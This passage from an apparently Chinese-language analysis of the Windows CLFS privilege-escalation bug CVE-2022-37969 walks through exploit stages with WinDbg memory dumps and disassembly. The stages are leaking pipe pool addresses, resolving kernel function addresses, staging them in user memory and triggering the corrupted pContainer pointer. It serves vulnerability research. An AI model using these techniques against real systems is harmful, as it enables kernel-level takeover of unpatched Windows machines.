参数为0x110038来读取管道属性。</p><p>EXP通过调用<code>NtQuerySystemInformation</code>并传递<code>SystemInformationClass</code>参数为<code>SystemBigPoolInformation</code>查询内核堆信息。通过循环遍历堆信息并比较堆tag找到了Pipe堆在内核的地址。</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/8.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db ffffa48d64eff000</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff000<span style="color:#ae81ff">50</span><span style="color:#ae81ff">25</span> a6<span style="color:#ae81ff">67</span><span style="color:#ae81ff">8</span>d a4 ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">50</span><span style="color:#ae81ff">25</span> a6<span style="color:#ae81ff">67</span><span style="color:#ae81ff">8</span>d a4 ff ff P<span style="color:#f92672">%</span>.g....P<span style="color:#f92672">%</span>.g....</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff010<span style="color:#ae81ff">28</span> f0 ef<span style="color:#ae81ff">64</span><span style="color:#ae81ff">8</span>d a4 ff ff<span style="color:#f92672">-</span>d6<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> (..d............</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff020<span style="color:#ae81ff">2</span>a f0 ef<span style="color:#ae81ff">64</span><span style="color:#ae81ff">8</span>d a4 ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>a<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">*</span>..d....Z.......</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff030<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff040<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff050<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff060<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff070<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span></code></pre></div><p>将系统EPROCESS进行异或后存到栈上的地址中</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/9.png"/></p><p>将41414141写到0x100000007的内存地址上</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/10.png"/></p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/11.png"/></p><p>获取到<code>SeSetAccessStateGenericMapping</code>函数地址</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/12.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> u fffff8046b3f2da0</span></span><span style="display:flex;"><span>nt<span style="color:#f92672">!</span>SeSetAccessStateGenericMapping:</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2da0<span style="color:#ae81ff">488</span>b4148 mov rax,qword ptr [rcx<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>h]</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2da4<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">1002</span> movups xmm0,xmmword ptr [rdx]</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2da7 f30f7f4008 movdqu xmmword ptr [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>],xmm0</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2dac c3 ret</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2dad cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2dae cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2daf cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2db0 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span></code></pre></div><p>获取<code>ClfsEarlierLsn</code>的内核地址</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/13.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> u FFFFF8046A9F1CB0</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn:</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cb0<span style="color:#ae81ff">488</span>b05c1240000 mov rax,qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">CLFS_LSN_INVALID</span> (fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f4178)]</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cb7<span style="color:#ae81ff">4885</span>c9 test rcx,rcx</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cba<span style="color:#ae81ff">7436</span> je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cf2)</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cbc<span style="color:#ae81ff">488</span>b09 mov rcx,qword ptr [rcx]</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cbf<span style="color:#ae81ff">483</span>b0d82210000 cmp rcx,qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">CLFS_LSN_NULL</span> (fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f3e48)]</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cc6<span style="color:#ae81ff">742</span>a je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cf2)</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cc8<span style="color:#ae81ff">483</span>bc8 cmp rcx,rax</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1ccb<span style="color:#ae81ff">7425</span> je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cf2)</span></span></code></pre></div><p>把两个函数布局到0x500008和0x500018上</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/14.png"/></p><p>触发漏洞<code>pContainer</code>指针高5位被清零，指针指向0x593a0，该地址为用户层内存地址。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rax</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd070<span style="color:#ae81ff">06</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">69</span> be<span style="color:#ae81ff">23</span> a9<span style="color:#ae81ff">92</span><span style="color:#ae81ff">15</span> ee<span style="color:#ae81ff">11</span> ........i.<span style="color:#960050;background-color:#1e0010">#</span>.....</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd080 bc<span style="color:#ae81ff">80</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">0</span>c<span style="color:#ae81ff">29</span><span style="color:#ae81ff">07</span> fc<span style="color:#ae81ff">32</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ....).<span style="color:#ae81ff">.2</span>........</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd090<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd0a0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">38</span><span style="color:#ae81ff">13</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> .......<span style="color:#ae81ff">.8</span>.......</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd0b0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd0c0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd0d0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd0e0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rax<span style="color:#f92672">-</span><span style="color:#ae81ff">0x11000</span></span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc070<span style="color:#ae81ff">01</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>b<span style="color:#ae81ff">21</span><span style="color:#ae81ff">72</span> e4<span style="color:#ae81ff">7f</span><span style="color:#ae81ff">15</span> ee<span style="color:#ae81ff">11</span> ........<span style="color:#f92672">+!</span>r.....</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc080 bc<span style="color:#ae81ff">7f</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">0</span>c<span style="color:#ae81ff">29</span><span style="color:#ae81ff">07</span> fc<span style="color:#ae81ff">32</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ....).<span style="color:#ae81ff">.2</span>........</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc090<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc0a0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc0b0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc0c0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">38</span><span style="color:#ae81ff">13</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> .......<span style="color:#ae81ff">.8</span>.......</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc0d0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc0e0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rax<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1468</span></span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de4d8<span style="color:#ae81ff">08</span> f0 fd c1<span style="color:#ae81ff">30</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">08</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#ae81ff">.0</span>...........</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de4e8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>a0<span style="color:#ae81ff">93</span><span style="color:#ae81ff">50</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ..........P.....</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de4f8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de508<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de518<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de528<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de538<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de548<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span></code></pre></div><p>获取<code>pContainer</code>指针，并尝试解引用pContainer获取到<code>CClfsContainer</code>对象，而后调用对象的指针</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/15.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ebf<span style="color:#ae81ff">498</span>b7f18 mov rdi, qword ptr [r15<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ec3<span 